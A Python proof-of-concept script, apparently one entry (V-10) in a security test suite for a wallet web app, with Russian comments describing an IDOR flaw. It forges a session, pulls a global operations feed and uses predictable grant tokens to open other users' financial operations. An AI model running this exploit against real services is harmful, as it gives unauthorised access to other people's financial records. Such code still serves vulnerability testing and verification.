# -*- coding: utf-8 -*-
"""V-10. IDOR: глобальная лента операций выдаёт grant-токены на чужие операции.

handlers_money.go, apiOpsFeed: отдаёт 30 последних операций ВСЕХ пользователей и
ставит cookie op_grant_<id> с валидным токеном на каждую. Дальше operation()
пускает к чужой операции по этому токену. Токен к тому же предсказуем
(signOpGrant на известном SESSION_KEY).
"""
import json
import re

from wallet_client import Client, parser, sign_opgrant, banner, ok, fail


def main():
    a = parser("IDOR через ленту операций").parse_args()
    c = Client(a.base)
    c.forge(1, "employee")

    st, _, body = c.get("/api/ops/feed")
    feed = json.loads(body.decode("utf-8"))
    banner(f"лента вернула {len(feed)} операций всех пользователей")

    opened = 0
    for it in feed:
        oid = it["id"]
        # токен уже в cookie op_grant_<id>; плюс считаем его сами из ключа
        tok = sign_opgrant(1, oid)
        st, _, b = c.get(f"/operations/{oid}?t={tok}")
        if st == 200 and "Операция #" in b.decode("utf-8", "replace"):
            opened += 1
    banner(f"открыто чужих/любых операций: {opened} из {len(feed)}")
    if opened == 0:
        fail("ни одна операция не открылась")
    ok("grant-токены предсказуемы и выдаются на чужие операции")


if __name__ == "__main__":
    main()
